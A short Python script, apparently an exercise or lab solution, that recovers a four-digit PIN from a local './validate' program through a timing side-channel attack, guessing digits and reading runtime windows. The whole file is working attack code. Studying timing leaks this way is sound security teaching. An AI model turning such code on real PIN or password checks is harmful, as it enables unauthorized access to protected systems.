import time, subprocess

def timeSideChannelAttack():
    PIN = None 
    firstNum = None
    secondNum = None
    thirdNum= None
    
    for i in range(4):
        for j in range(10):
            if firstNum is None:
                PIN = str(j) + "000"
            elif secondNum is None:
                PIN = firstNum + str(j) + "00"
            elif thirdNum is None:
                PIN = firstNum + secondNum + str(j) + "0"
            else:
                PIN = firstNum + secondNum + thirdNum + str(j)

            startTime = time.perf_counter()

            result = subprocess.run(["./validate", PIN], capture_output=True)

            endTime = time.perf_counter()

            duration = endTime - startTime

            if result.returncode == 0:
                print(f"Found PIN: {PIN}")
                return

            if duration > 0.15 and duration < 0.25:
                if firstNum is None:
                    firstNum = str(j)
                    print(f"Found digit: {firstNum}")
                    break
            elif duration > 0.25 and duration < 0.35:
                if secondNum is None:
                    secondNum = str(j)
                    print(f"Found digit: {firstNum}{secondNum}")
                    break 
            elif duration > 0.35 and duration < 0.45:
                if thirdNum is None:
                    thirdNum = str(j)
                    print(f"Found digit: {firstNum}{secondNum}{thirdNum}")
                    break
    print("PIN nicht gefunden")


timeSideChannelAttack()
                



